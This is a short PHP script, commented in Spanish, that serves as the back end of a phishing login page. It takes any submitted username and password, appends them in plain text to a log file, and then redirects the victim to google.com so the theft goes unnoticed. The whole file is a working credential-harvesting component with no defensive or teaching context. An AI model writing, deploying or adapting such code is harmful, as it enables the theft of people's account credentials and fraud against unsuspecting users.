<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Guardar los datos en un archivo de texto
    $file = fopen("log.txt", "a");
    fwrite($file, "Usuario: " . $username . " - Contraseña: " . $password . "\n");
    fclose($file);

    // Redireccionar a una página legítima (opcional)
    header("Location: https://www.google.com");
    exit();
}
?>
